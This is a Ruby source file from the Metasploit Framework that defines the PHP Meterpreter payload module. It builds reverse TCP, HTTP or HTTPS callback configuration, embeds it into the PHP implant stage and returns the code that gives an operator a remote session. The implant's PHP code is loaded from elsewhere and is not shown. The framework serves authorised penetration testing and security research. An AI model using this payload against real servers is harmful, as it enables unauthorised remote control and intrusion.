##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::TransportConfig
  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'PHP Meterpreter',
        'Description' => 'Run a meterpreter server in PHP',
        'Author' => ['egypt'],
        'Platform' => 'php',
        'Arch' => ARCH_PHP,
        'License' => MSF_LICENSE,
        'Session' => Msf::Sessions::Meterpreter_Php_Php
      )
    )
  end

  def generate_config(opts = {})
    ds = opts[:datastore] || datastore
    opts[:uuid] ||= generate_payload_uuid

    unless opts[:transport_config]
      scheme = opts[:scheme] || 'tcp'
      if scheme == 'https'
        opts[:transport_config] = [transport_config_reverse_https(opts)]
      elsif scheme == 'http'
        opts[:transport_config] = [transport_config_reverse_http(opts)]
      else
        opts[:transport_config] = [transport_config_reverse_tcp(opts)]
      end
    end

    config_opts = {
      ascii_str:         true,
      null_session_guid: opts[:stageless] == true,
      expiration:        (ds[:expiration] || ds['SessionExpirationTimeout']).to_i,
      uuid:              opts[:uuid],
      transports:        opts[:transport_config],
      stageless:         opts[:stageless] == true,
    }.merge(meterpreter_logging_config(opts))

    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
    config.to_b
  end

  def generate_stage(opts = {})
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.php')

    # Build the URI from the callback URL if present
    unless opts[:url].to_s == ''
      opts[:scheme] ||= opts[:url].to_s.split(':')[0]
      uri = "/#{opts[:url].split('/').reject(&:empty?)[-1]}"
      opts[:uri] = "#{luri}#{uri}"
    end

    # Generate the TLV config block containing all transport configuration
    config_block = Rex::Text.encode_base64(generate_config(opts))
    met = met.sub('"CONFIG_BLOCK", ""', "\"CONFIG_BLOCK\", \"#{config_block}\"")

    if datastore['MeterpreterDebugBuild']
      met.sub!(%q{define("MY_DEBUGGING", false);}, %|define("MY_DEBUGGING", true);|)

      logging_options = Msf::OptMeterpreterDebugLogging.parse_logging_options(datastore['MeterpreterDebugLogging'])
      met.sub!(%q{define("MY_DEBUGGING_LOG_FILE_PATH", false);}, %|define("MY_DEBUGGING_LOG_FILE_PATH", "#{logging_options[:rpath]}");|) if logging_options[:rpath]
    end

    met.gsub!(/#.*?$/, '')
    met
  end
end
